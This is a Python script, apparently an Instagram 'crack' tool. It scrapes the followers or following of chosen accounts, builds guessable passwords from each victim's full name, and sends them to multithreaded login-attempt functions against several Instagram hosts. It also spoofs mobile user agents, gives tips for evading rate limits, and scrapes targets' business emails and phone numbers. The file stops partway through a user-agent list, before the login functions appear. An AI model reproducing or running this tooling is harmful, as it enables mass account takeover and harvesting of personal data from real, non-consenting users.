#================[IMPORT MODULE]================#
import unicodedata, urllib.parse, requests, random, sys, uuid, json, hmac, hashlib, time, re, base64, datetime, urllib.request, string, os
from urllib.parse import quote; from concurrent.futures import ThreadPoolExecutor; from bs4 import BeautifulSoup as bsp
from rich.console import Console; from rich.panel import Panel as Pan, Panel as nel, Panel as panel; from rich import print as cetak
import threading; from rich.columns import Columns; from rich.progress import Progress, TextColumn, SpinnerColumn
from rich.text import Text
from concurrent.futures import ThreadPoolExecutor
import threading
import struct
import base64
import string
import uuid
import json
import requests
import pytz
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_v1_5
from rich import print as Cetak; from rich.tree import Tree; from rich.panel import Panel
import urllib.parse
from urllib.parse import quote
import re
import os
import sys
import json
import random
import urllib.request
import hashlib
import time
import uuid
import requests
import base64
import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel as panel
from rich import print as prints
from datetime import datetime
# Global variables
Uid, Uuid = [], []
bkas = []
Ok, Cp, Loop = 0, 0, 0
xx = 0
SistemLog = "api.instagram.com"

# Color codes
WHITE = '\x1b[1;97m'
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
PURPLE = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
ORANGE = '\033[38;2;255;127;0;1m'
RESET = '\x1b[0m'
campur = random.choice([WHITE, GREEN, YELLOW, BLUE, PURPLE, CYAN, ORANGE, RESET])

getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS = {
    'Host': 'www.instagram.com',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'x-asbd-id': '129477',
    'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
    'sec-fetch-site': 'same-origin',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
}
ua = {
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)'
}
userinfo = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Clear():
    try:
        os.system('clear')
    except:
        pass

def find_res():
    cookie = None
    try:
        if os.path.isfile('data/OK.txt'):
            with open('data/OK.txt', 'r') as f:
                lines = f.read().splitlines()
                for line in lines:
                    if 'sessionid=' in line:
                        cookie = line.strip()
                        break
        if not cookie and os.path.isfile('data/cookie.txt'):
            with open('data/cookie.txt', 'r') as f:
                cookie = f.read().strip()
    except:
        pass
    return cookie

def test_cookies(coki):
    """Test if cookies are still valid using multiple methods"""
    
    # Method 1: Try to get user info using the API
    try:
        # Extract ds_user_id from cookie
        uid_match = re.search('ds_user_id=(\\d+)', str(coki.get('cookie', '')))
        if uid_match:
            uid = uid_match.group(1)
            response = requests.get(
                f'https://i.instagram.com/api/v1/users/{uid}/info/',
                headers=ua,
                cookies=coki,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                if 'user' in data and data['user'].get('username'):
                    print(f"{GREEN}✓ Cookies are valid!{RESET}")
                    print(f"{WHITE}  Username: {CYAN}{data['user'].get('username')}{RESET}")
                    print(f"{WHITE}  Full Name: {CYAN}{data['user'].get('full_name', 'N/A')}{RESET}")
                    print(f"{WHITE}  Followers: {CYAN}{data['user'].get('follower_count', 0)}{RESET}")
                    return True
    except Exception as e:
        pass
    
    # Method 2: Try to access the login ajax endpoint
    try:
        test_session = requests.Session()
        test_session.max_redirects = 3
        response = test_session.get(
            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
            cookies=coki,
            timeout=10,
            allow_redirects=False
        )
        
        if response.status_code == 200:
            print(f"{GREEN}✓ Cookies are valid!{RESET}")
            return True
        elif response.status_code == 302 or response.status_code == 401:
            print(f"{RED}✗ Cookies may be expired!{RESET}")
            return False
    except Exception as e:
        pass
    
    # Method 3: Try to get the user's profile page
    try:
        test_session = requests.Session()
        test_session.max_redirects = 3
        response = test_session.get(
            'https://www.instagram.com/',
            cookies=coki,
            timeout=10,
            allow_redirects=False
        )
        
        if response.status_code == 200:
            # Check if we got a login page or actual content
            if 'login' not in response.text.lower() or 'sessionid' in str(coki):
                print(f"{GREEN}✓ Cookies are valid!{RESET}")
                return True
            else:
                print(f"{RED}✗ Cookies may be expired!{RESET}")
                return False
    except Exception as e:
        pass
    
    # Method 4: Try to get csrf token from shared_data
    try:
        response = requests.get(
            'https://www.instagram.com/data/shared_data/',
            cookies=coki,
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if 'config' in data and 'csrf_token' in data['config']:
                print(f"{GREEN}✓ Cookies are valid!{RESET}")
                return True
    except Exception as e:
        pass
    
    print(f"{RED}✗ Cookies appear to be invalid!{RESET}")
    return False

def validate_cookie_format(cookie_str):
    """Validate if the cookie string has required fields"""
    required_fields = ['sessionid', 'ds_user_id']
    missing = []
    
    for field in required_fields:
        if field not in cookie_str:
            missing.append(field)
    
    if missing:
        print(f"{RED}✗ Cookie is missing: {', '.join(missing)}{RESET}")
        return False
    
    # Check if sessionid has valid format (should have numbers)
    session_match = re.search('sessionid=([^;]+)', cookie_str)
    if session_match:
        session_value = session_match.group(1)
        if not session_value or len(session_value) < 5:
            print(f"{RED}✗ Session ID appears invalid (too short){RESET}")
            return False
    
    # Check if ds_user_id is present
    user_match = re.search('ds_user_id=([^;]+)', cookie_str)
    if user_match:
        user_id = user_match.group(1)
        if not user_id.isdigit():
            print(f"{RED}✗ User ID appears invalid (not a number){RESET}")
            return False
    
    print(f"{GREEN}✓ Cookie format looks valid{RESET}")
    return True

def Aset_Ig():
    os.system('clear')
    coki = {}
    
    # Try to load existing cookie
    if os.path.isfile('data/cookie.txt'):
        cookie_str = open('data/cookie.txt', 'r').read().strip()
        if cookie_str:
            coki = {'cookie': cookie_str}
            print(f"{YELLOW}Found existing cookie, testing...{RESET}")
            
            # Validate cookie format first
            if not validate_cookie_format(cookie_str):
                print(f"{RED}Cookie format is invalid, please re-enter.{RESET}")
                time.sleep(2)
                os.remove('data/cookie.txt')
                coki = {}
    
    if not coki:
        print(f"{RED}[{WHITE}+{RED}] {CYAN}Please enter your instagram account cookie. Make sure to use a throwaway account!")
        print(f"{YELLOW}Cookie should contain: sessionid, ds_user_id, csrftoken{RESET}")
        cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
        
        if cookie_input.lower() == 'res':
            cookie_str = find_res()
            if not cookie_str:
                print(f"{RED}Failed to load backup cookie, please enter manually.")
                cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
                coki = {'cookie': cookie_input}
            else:
                coki = {'cookie': cookie_str}
        else:
            coki = {'cookie': cookie_input}
        
        # Validate format of manually entered cookie
        if not validate_cookie_format(coki['cookie']):
            print(f"{RED}Invalid cookie format! Please check your input.{RESET}")
            time.sleep(3)
            return Aset_Ig()
    
    try:
        # Extract user ID from cookie
        uid_match = re.search('ds_user_id=(\\d+)', str(coki['cookie']))
        if not uid_match:
            print(f"{RED}Could not find ds_user_id in cookie!{RESET}")
            time.sleep(2)
            return Aset_Ig()
        
        uid = uid_match.group(1)
        
        # Get user info
        resp = requests.get(
            f'https://i.instagram.com/api/v1/users/{uid}/info/',
            headers=ua,
            cookies=coki,
            timeout=10
        )
        resp.raise_for_status()
        user_data = resp.json().get('user', {})
        
        if not user_data:
            print(f"{RED}Failed to get user data!{RESET}")
            time.sleep(2)
            return Aset_Ig()
        
        full_name = user_data.get('full_name', 'Name Unknown')
        follower_count = user_data.get('follower_count', 0)
        username = user_data.get('username', 'Unknown')
        
        # Save cookie if valid
        open('data/cookie.txt', 'w').write(coki['cookie'])
        
        print(f"{GREEN}✓ Successfully logged in as: {username}{RESET}")
        print(f"{WHITE}  Full Name: {CYAN}{full_name}{RESET}")
        print(f"{WHITE}  Followers: {CYAN}{follower_count}{RESET}")
        time.sleep(1)
        
        return coki, full_name, follower_count
        
    except requests.exceptions.RequestException as e:
        print(f"{RED}Network error: {e}{RESET}")
        time.sleep(2)
        return Aset_Ig()
    except json.JSONDecodeError:
        print(f"{RED}Invalid response from server. Cookie may be expired.{RESET}")
        os.system('rm -rf data/cookie.txt')
        time.sleep(2)
        return Aset_Ig()
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        os.system('rm -rf data/cookie.txt')
        time.sleep(2)
        return Aset_Ig()

def Menu():
    os.system('clear')
    aset, nama, fol = Aset_Ig()
    print(f"{BLUE}═" * 80)
    print(f"""{campur} 
 _______  ______ _______ _______ _     _      _____  ______
 |       |_____/ |_____| |       |____/         |   |  ____
 |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
                                          
{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
{CYAN}│ {CYAN}Author : {GREEN}sumon {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
    
    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}03{RED}] {CYAN} Crack from file\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
    print(f"{BLUE}═" * 80)
    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")

    if x in ['01', '1']:
        dumps(aset, True)
    elif x in ['02', '2']:
        dumps(aset, False)
    elif x in ['03', '3']:
        crackfile()
    elif x in ['00', '0']:
        os.system("rm -rf data/cookie.txt")
        prints(f"{GREEN}Successfully deleted cookies")
        exit()
    else:
        print(f"{RED}Invalid option!")
        time.sleep(1)
        Menu()

def crackfile():
    try:
        nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
        if not os.path.isfile(nu):
            print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
            return Menu()
            
        with open(nu, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    Uuid.append(line)
        print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
        if len(Uuid) > 0:
            MetodeType()
        else:
            print(f"{RED}No valid IDs found in file!")
            return Menu()
    except Exception as e:
        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}Error: {e}")
        return Menu()

def get_user_id_methods(username, cookies):
    """Try multiple methods to get user ID"""
    
    # Method 1: Try using the official API
    try:
        url = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104',
            'x-ig-app-id': '1217981644879628',
            'Accept': 'application/json'
        }
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'user' in data['data']:
                user_id = data['data']['user'].get('id')
                if user_id:
                    return user_id
    except Exception as e:
        pass
    
    # Method 2: Try using the graphql API
    try:
        url = 'https://www.instagram.com/graphql/query/'
        params = {
            'query_hash': 'c9100bf9110dd6361671f113dd02e7d6',
            'variables': json.dumps({'username': username})
        }
        response = requests.get(url, params=params, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'user' in data['data']:
                user_id = data['data']['user'].get('id')
                if user_id:
                    return user_id
    except Exception as e:
        pass
    
    # Method 3: Try scraping with limited redirects
    try:
        session = requests.Session()
        session.max_redirects = 3
        response = session.get(f'https://www.instagram.com/{username}/', cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            # Try to find user_id in the page source
            patterns = [
                r'"user_id":"(\d+)"',
                r'"profilePage_(\d+)"',
                r'"id":"(\d+)","username":"' + username + '"',
                r'{"id":"(\d+)","username":"' + username + '"',
                r'"id":"(\d+)"[^}]*"username":"' + username + '"'
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
                    
    except Exception as e:
        pass
    
    return None

def dumps(cintil, typess):
    global xx, Uuid
    xx = 0
    
    # Test cookies first
    if not test_cookies(cintil):
        print(f"{YELLOW}Warning: Your cookies may be invalid. Proceeding anyway...")
        time.sleep(1)
    
    xyz = []
    if 'csrftoken' not in str(cintil):
        try:
            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil, timeout=10)
            memek.raise_for_status()
            token = memek.json()['config']['csrf_token']
            cintil['cookie'] += ';csrftoken=%s;' % token
        except Exception as e:
            os.system('rm -rf data/cookie.txt')
            exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
    
    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking\nExample: user1,user2,user3", style="Purple"))
    users_input = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").strip()
    
    if not users_input:
        print(f"{RED}No username entered!")
        return Menu()
    
    users = [u.strip() for u in users_input.split(',') if u.strip()]
    
    print(f"\n{YELLOW}Fetching user IDs...")
    
    try:
        for y in users:
            print(f"{WHITE}Fetching user ID for: {CYAN}{y}")
            
            user_id = get_user_id_methods(y, cintil)
            
            if user_id:
                if user_id not in xyz:
                    xyz.append(user_id)
                    print(f"{GREEN}✓ Found user ID: {user_id} for {y}")
            else:
                print(f"{RED}✗ Could not find user ID for: {y}")
                
            # Small delay between requests
            time.sleep(0.5)
                
    except Exception as e:
        print(f"{RED}Error getting user IDs: {e}")
        return Menu()
    
    if not xyz:
        print(f"{RED}No valid user IDs found! Make sure the usernames are correct.")
        time.sleep(2)
        return Menu()
    
    print(f"\n{GREEN}Found {len(xyz)} valid user IDs")
    
    try:
        mode = 'followers' if typess else 'following'
        print(f"\n{YELLOW}Starting to dump {mode}...")
        
        for kintil in xyz:
            print(f"\n{WHITE}Processing user ID: {CYAN}{kintil}")
            if typess:
                Graphql(True, kintil, cintil['cookie'], '')
            else:
                Graphql(False, kintil, cintil['cookie'], '')
                
            # Add delay between users to avoid rate limiting
            time.sleep(1)
            
    except Exception as e:
        print(f"{RED}Error during dump: {e}")
    
    print(f"\n{GREEN}Total users collected: {len(Uuid)}")
    print("")
    
    if len(Uuid) > 0:
        print(f"{GREEN}Collected {len(Uuid)} users successfully!")
        time.sleep(1)
        MetodeType()
    else:
        print(f"{RED}No users collected. Check if the target accounts are private or have no {mode}.")
        time.sleep(2)
        Menu()

def Graphql(typess, userid, cokie, after):
    global xx, Uuid
    
    # Safety check for xx initialization
    if 'xx' not in globals():
        global xx
        xx = 0
    
    api = "https://www.instagram.com/graphql/query/"
    
    # Use the correct query hash for followers/following
    if typess:
        # Followers
        query_hash = "37479f2b8209594dde7facb0d904896a"
    else:
        # Following
        query_hash = "58712303d941c6855d4e888c5f0cd22f"
    
    variables = {
        "id": userid,
        "first": 50,  # Increased to get more results per request
        "after": after
    }
    
    params = {
        'query_hash': query_hash,
        'variables': json.dumps(variables)
    }
    
    try:
        ptk = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104",
            "accept": "application/json",
            "cookie": cokie,
            "x-ig-app-id": "1217981644879628"
        }
        
        # Add timeout and limit redirects
        session = requests.Session()
        session.max_redirects = 5
        
        req = session.get(api, params=params, headers=ptk, timeout=30)
        req.raise_for_status()
        req_json = req.json()
        
        # Check for errors
        if 'require_login' in req_json:
            print(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie - Need to login')
            return
        
        if 'status' in req_json and req_json['status'] == 'fail':
            print(f'\n{RED}Request failed: {req_json.get("message", "Unknown error")}')
            return
        
        # Determine the correct key based on typess
        khm = 'edge_followed_by' if typess else 'edge_follow'
        
        # Check if user exists in response
        if 'data' not in req_json or 'user' not in req_json['data'] or not req_json['data']['user']:
            print(f"\n{RED}User not found or private. Skipping...")
            return
        
        user_data = req_json['data']['user']
        
        # Check if the user has the requested data
        if khm not in user_data:
            print(f"\n{RED}This user has no visible {khm.replace('edge_', '')} or is private")
            return
        
        # Process the edges
        edges = user_data[khm].get('edges', [])
        if not edges:
            print(f"\n{YELLOW}No {khm.replace('edge_', '')} found for this user")
            return
        
        print(f"\n{GREEN}Found {len(edges)} {khm.replace('edge_', '')} in this batch")
        
        for xyz in edges:
            username = xyz['node'].get('username', '')
            full_name = xyz['node'].get('full_name', '')
            
            if username:
                xy = username + '|' + full_name
                if xy not in Uuid:
                    xx += 1
                    Uuid.append(xy)
                    print(f'\r{WHITE}Collecting Uid {RED}{len(Uuid)}{WHITE}                            ', end='', flush=True)
                    time.sleep(0.001)  # Small delay to avoid overwhelming
        
        # Check for pagination
        page_info = user_data[khm].get('page_info', {})
        end = page_info.get('has_next_page', False)
        
        if end:
            after = page_info.get('end_cursor', '')
            if after:
                print(f"\n{YELLOW}Loading next page...")
                time.sleep(0.5)  # Add delay between pagination requests
                Graphql(typess, userid, cokie, after)
                
    except requests.exceptions.Timeout:
        print(f"\n{RED}Timeout error while fetching {khm.replace('edge_', '')}")
    except requests.exceptions.TooManyRedirects:
        print(f"\n{RED}Too many redirects - check your cookies")
    except requests.exceptions.RequestException as e:
        print(f"\n{RED}Network error: {e}")
    except json.JSONDecodeError as e:
        print(f"\n{RED}Invalid JSON response: {e}")
    except KeyError as e:
        print(f"\n{RED}Key error: {e} - Check response structure")
    except Exception as e:
        print(f"\n{RED}Unexpected error: {e}")

def MetodeType():
    global SistemLog
    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}www.instagram.com method {GREEN}Recommended{WHITE}
{RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
{RED}[{CYAN}03{RED}] {WHITE}i.instagram.com method
{RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
    if method in ['01', '1']:
        SistemLog = "api.instagram.com"
    elif method in ['02', '2']:
        SistemLog = "i.instagram.com"
    elif method in ['03', '3']:
        SistemLog = "www.instagram.com"
    elif method in ['04', '4']:
        SistemLog = "b.i.instagram.com"
    else:
        SistemLog = "api.instagram.com"
    SetCrack()

def SetCrack():
    os.system("clear")
    print(f"""
{YELLOW}═══════════════════════════════════════════════════════════════
{YELLOW}          {CYAN}CRACKING {GREEN}PROCESSING ⚡
{YELLOW}═══════════════════════════════════════════════════════════════{WHITE}
""")
    print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
    
    if len(Uuid) == 0:
        print(f"{RED}No users to crack!")
        return Menu()
    
    print(f"{GREEN}Starting crack with {len(Uuid)} users...")


    with ThreadPoolExecutor(max_workers=30) as ASF:
        for i in Uuid:
            try:
                if '|' not in i:
                    continue
                username, name = i.split('|', 1)
                kontol = Password(name)
                if SistemLog == "api.instagram.com":
                    ASF.submit(Crack_api, username, kontol)
                elif SistemLog == "i.instagram.com":
                    ASF.submit(Crack_i, username, kontol)
                elif SistemLog == "www.instagram.com":
                    ASF.submit(Crack_w, username, kontol)
                elif SistemLog == "b.i.instagram.com":
                    ASF.submit(Crack_N, username, kontol)
            except Exception as e:
                continue
    
    print(f' \n\n {GREEN}Cracking completed')
    print(f"{GREEN}Successful: {Ok}, Checkpoint: {Cp}")
    time.sleep(3)
    Menu()

def Password(name):
    xxzx = []
    for nama in name.split(' '):
        nama = nama.lower()
        if len(nama) < 3:
            continue
        elif len(nama) in [3, 4, 5]:
            xxzx.append(nama + '123')
            xxzx.append(nama + '@12')
            xxzx.append(nama + '1234')
            xxzx.append('57273200')
            xxzx.append(nama + '12')
            xxzx.append(nama.capitalize() + '123')
            xxzx.append(nama.capitalize() + '1234')
        else:
            xxzx.append(nama + '123')
            xxzx.append(nama + '@12')
            xxzx.append(nama + '1234')
            xxzx.append('57273200')
            xxzx.append(nama + '12')
            xxzx.append(nama.capitalize() + '123')
            xxzx.append(nama.capitalize() + '1234')
    return xxzx


def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2' % (ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies not found, error during conversion'
    return donez

ses = requests.Session()

def data_target(name):
    post = peng = meng = mail = fullname = fbid = phone = None
    for y in name.split(','):
        try:
            HEADERS.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
                'x-ig-app-id': '1217981644879628'
            })
            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS, timeout=10).json()['data']['user']
            post = profil_info_target["edge_owner_to_timeline_media"]["count"]
            peng = profil_info_target["edge_followed_by"]["count"]
            meng = profil_info_target["edge_follow"]["count"]
            mail = profil_info_target.get("business_email")
            phone = profil_info_target.get("business_phone_number")
            fullname = profil_info_target["full_name"]
            fbid = profil_info_target["fbid"]
        except Exception as e:
            pass
    return post, peng, meng, mail, fullname, fbid, phone

def UserAgentBarcelona():
    android_version = random.choice(["27/9","27/10","27/11","27/12","27/12","27/13","28/9","28/10","28/11","28/12","28/12","28/13","29/9","29/10","29/11","29/12","29/12","29/13","27/9","30/10","30/11","30/12","30/12","30/13","31/9","31/10","31/11","31/12","31/12","31/13","32/9","32/10","32/11","32/12","32/12","32/13","33/9","33/10","33/11","33/12","33/12","33/13"])
    dpi = random.choice(['240dpi','240dpi','320dpi','400dpi','480dpi','320dpi','320dpi','240dpi','280dpi','240dpi','240dpi','160dpi','320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
    pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
    kode = random.choice(['145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','2